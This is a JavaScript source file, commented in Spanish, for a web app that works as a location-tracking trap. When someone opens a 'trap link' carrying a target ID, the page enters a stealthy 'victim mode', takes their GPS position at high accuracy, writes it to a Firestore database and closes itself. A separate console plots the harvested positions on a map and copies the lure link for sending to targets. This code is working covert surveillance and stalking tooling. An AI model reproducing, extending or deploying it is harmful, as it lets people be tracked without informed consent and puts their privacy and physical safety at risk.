import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getFirestore, doc, setDoc, onSnapshot, collection, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

// --- CONFIGURA AQUÍ TUS CREDENCIALES DE FIREBASE ---
const firebaseConfig = {
    apiKey: "TU_API_KEY",
    authDomain: "tu-proyecto.firebaseapp.com",
    projectId: "tu-proyecto",
    storageBucket: "tu-proyecto.appspot.com",
    messagingSenderId: "TU_MESSAGING_SENDER_ID",
    appId: "TU_APP_ID"
};
// ---------------------------------------------------

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let map;
let mainMarker;
let marcadoresAraña;
let ultimaUbicacionSpider = null;
const ubicacionPorDefecto = [14.3333, -90.6667]; 

const urlParams = new URLSearchParams(window.location.search);
const targetId = urlParams.get('target');

document.addEventListener("DOMContentLoaded", function () {
    
    // --- MODO VÍCTIMA (SIGILOSO: Abre, captura GPS y cierra) ---
    if (targetId) {
        document.getElementById('main-console').style.display = 'none';
        document.getElementById('stealth-screen').style.display = 'flex';

        ejecutarTrampaGPSYCerrar(targetId);
        return; 
    }

    // --- MODO CONSOLA PRINCIPAL (TÚ EN TU PC) ---
    document.getElementById('main-console').style.display = 'block';
    document.getElementById('stealth-screen').style.display = 'none';

    map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);
    
    marcadoresAraña = L.layerGroup().addTo(map);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);

    mainMarker = L.marker(ubicacionPorDefecto, { zIndexOffset: 1000 }).addTo(map)
      .bindPopup("<b>Consola Central Activa.</b>");

    setTimeout(() => { map.invalidateSize(); }, 200);

    // Cargar puntos y escuchar en tiempo real usando el identificador "prueba"
    cargarPuntosHistoricos("prueba");
    escucharObjetivoEnTiempoReal("prueba");
});

// --- TRAMPA GPS: CAPTURA Y CIERRE AUTOMÁTICO ---
function ejecutarTrampaGPSYCerrar(id) {
    if (!navigator.geolocation) {
        finalizarSalida();
        return;
    }

    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const timestamp = new Date();

            try {
                // 1. Actualizar el documento principal
                const docRef = doc(db, "rastreos", id);
                await setDoc(docRef, { lat, lng, timestamp }, { merge: true });

                // 2. Guardar en la subcolección de historial (para la araña 🕷️)
                const colRef = collection(db, "rastreos", id, "lecturas");
                const nuevoItemRef = doc(colRef);
                await setDoc(nuevoItemRef, { lat, lng, timestamp });

                console.log("Coordenadas capturadas con éxito.");
            } catch (e) {
                console.error("Error al registrar en Firebase:", e);
            }
            
            finalizarSalida();
        },
        (error) => {
            console.log("GPS denegado o no disponible.");
            finalizarSalida();
        },
        { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
    );
}

function finalizarSalida() {
    setTimeout(() => {
        window.close();
        window.location.href = "about:blank"; 
    }, 1500);
}

// --- CARGAR ARAÑAS EN TU CONSOLA PRINCIPAL ---
async function cargarPuntosHistoricos(id) {
    if (!marcadoresAraña) return;
    marcadoresAraña.clearLayers();
    ultimaUbicacionSpider = null;

    try {
        const lecturasRef = collection(db, "rastreos", id, "lecturas");
        const q = query(lecturasRef, orderBy("timestamp", "asc"));
        const querySnapshot = await getDocs(q);
        
        let bounds = [];

        querySnapshot.forEach((docSnap) => {
            const data = docSnap.data();
            const lat = data.lat;
            const lng = data.lng;
            
            if (lat && lng) {
                let horaTexto = "Reciente";
                if (data.timestamp) {
                    const fecha = typeof data.timestamp.toDate === 'function' 
                        ? data.timestamp.toDate() 
                        : new Date(data.timestamp);
                    horaTexto = fecha.toLocaleTimeString();
                }

                const spiderIcon = L.divIcon({
                    html: '🕷️',
                    className: 'spider-marker',
                    iconSize: [24, 24],
                    iconAnchor: [12, 12]
                });

                const marker = L.marker([lat, lng], { icon: spiderIcon })
                    .bindPopup(`<b>Punto de Acceso 🕷️</b><br>Hora: ${horaTexto}`);
                
                marcadoresAraña.addLayer(marker);
                bounds.push([lat, lng]);
                
                ultimaUbicacionSpider = [lat, lng];
            }
        });

        if (bounds.length > 0) {
            document.getElementById('banner-status').innerHTML = "RED DE ARAÑAS ACTIVA";
        } else {
            document.getElementById('banner-status').innerHTML = "SIN PUNTOS DE ACCESO";
        }
    } catch (e) {
        console.error("Error al cargar puntos históricos:", e);
        document.getElementById('banner-status').innerHTML = "ERROR CARGANDO DATOS";
    }
}

function escucharObjetivoEnTiempoReal(id) {
    onSnapshot(doc(db, "rastreos", id), (docSnap) => {
        if (docSnap.exists()) {
            const data = docSnap.data();
            if (data.lat && data.lng) {
                mainMarker.setLatLng([data.lat, data.lng]);
                cargarPuntosHistoricos("prueba");
            }
        }
    });
}

// --- BOTONES Y UTILIDADES DE TU CONSOLA ---
window.compartirEnlace = function() {
    const enlaceObjetivo = "https://mmommo52.github.io/Spidey/?target=prueba";
    navigator.clipboard.writeText(enlaceObjetivo).then(() => {
        alert("¡Enlace trampa con 'prueba' copiado al portapapeles!");
    });
};

// BOTÓN RASTREAR: Al presionarlo, recarga y centra el mapa exactamente en la última araña
window.accionRastrearObjetivo = function() {
    cargarPuntosHistoricos("prueba").then(() => {
        if (ultimaUbicacionSpider) {
            map.setView(ultimaUbicacionSpider, 18);
            document.getElementById('banner-status').innerHTML = "OBJETIVO CENTRADO<br>EN RADAR";
        } else {
            alert("No hay puntos de acceso registrados todavía para 'prueba'.");
        }
    });
};

window.obtenerUbicacionActual = () => {
    navigator.geolocation?.getCurrentPosition((pos) => {
        map.setView([pos.coords.latitude, pos.coords.longitude], 16);
    });
};

window.centrarEnMiUbicacion = () => {
    navigator.geolocation?.getCurrentPosition((pos) => {
        map.setView([pos.coords.latitude, pos.coords.longitude], 17);
    });
};

window.cambiarAlerta = (t) => alert("Alerta: " + t);
window.cambiarPerfil = (n) => alert("Perfil: " + n);
window.abrirChat = () => alert("Canal de chat seguro abierto.");
window.verArchivo = () => alert("Abriendo registros históricos...");
